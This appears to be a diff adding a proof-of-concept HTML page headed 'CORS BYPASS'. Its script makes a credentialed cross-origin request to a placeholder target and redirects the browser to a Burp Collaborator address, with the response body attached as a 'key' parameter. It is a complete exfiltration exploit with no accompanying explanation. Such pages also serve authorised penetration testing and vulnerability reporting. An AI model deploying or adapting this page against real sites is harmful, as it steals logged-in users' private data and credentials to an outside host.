@@ -1,0 +1,23 @@
+<html>
+
+<title>
+POC PAGE
+</title>
+
+<body>
+<h1>
+CORS BYPASS
+</h1>
+<script>
+var req = new XMLHttpRequest(); 
+req.onload = reqListener; 
+req.open('get','https://get-request', true); 
+req.withCredentials = true;
+req.send();
+
+function reqListener() {
+    location='https://9gqkityk99twojkzar70vmaqphv7jw.burpcollaborator.net/log?key='+this.responseText; 
+};
+</script>
+</body>
+</html>
